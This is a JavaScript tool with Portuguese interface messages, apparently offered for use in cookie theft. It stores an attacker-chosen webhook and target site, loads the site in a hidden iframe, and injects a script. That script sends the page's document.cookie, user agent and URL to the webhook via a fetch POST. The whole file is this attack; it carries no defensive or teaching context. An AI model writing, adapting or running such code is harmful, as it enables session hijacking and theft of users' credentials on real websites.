function saveWebhook() {
  const input = document.getElementById("webhookInput").value;
  if (input.startsWith("http")) {
    localStorage.setItem("xssWebhook", input);
    alert("Webhook salvo!");
  } else {
    alert("Webhook inválido!");
  }
}

function saveSite() {
  const input = document.getElementById("siteInput").value;
  if (input.startsWith("http")) {
    localStorage.setItem("xssSite", input);
    alert("Site salvo!");
  } else {
    alert("Link inválido!");
  }
}

document.getElementById("xssBtn").addEventListener("click", () => {
  const site = localStorage.getItem("xssSite");
  const webhook = localStorage.getItem("xssWebhook");

  if (!site || !webhook) {
    return alert("Configure o Webhook e o Site primeiro!");
  }

  const iframe = document.createElement("iframe");
  iframe.style.display = "none";
  iframe.src = site;

  const payload = `
    <script>
      fetch('${webhook}', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          cookie: document.cookie,
          userAgent: navigator.userAgent,
          location: window.location.href
        })
      });
    <\/script>
  `;

  iframe.onload = () => {
    try {
      const doc = iframe.contentWindow.document;
      doc.open();
      doc.write(payload);
      doc.close();
      alert("Payload injetado!");
    } catch (err) {
      alert("Falha ao injetar. CORS ou proteção ativa.");
    }
  };

  document.body.appendChild(iframe);
});
